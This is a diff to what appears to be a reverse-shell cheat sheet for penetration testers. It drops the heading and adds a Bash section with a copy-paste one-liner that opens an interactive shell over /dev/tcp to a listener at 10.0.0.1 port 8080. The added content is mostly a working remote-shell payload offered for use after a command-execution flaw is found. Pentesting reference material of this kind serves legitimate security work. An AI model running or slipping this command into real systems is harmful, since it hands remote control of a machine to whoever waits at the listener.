@@ -1,4 +1,3 @@
-# Reverse Shell Cheat Sheet
 
 If you’re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you’ll probably want an interactive shell.
 
@@ -10,3 +9,8 @@ The examples shown are tailored to Unix-like systems.  Some of the examples belo
 
 Each of the methods below is aimed to be a one-liner that you can copy/paste.  As such they’re quite short lines, but not very readable.
 
+## Bash
+Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
+```
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
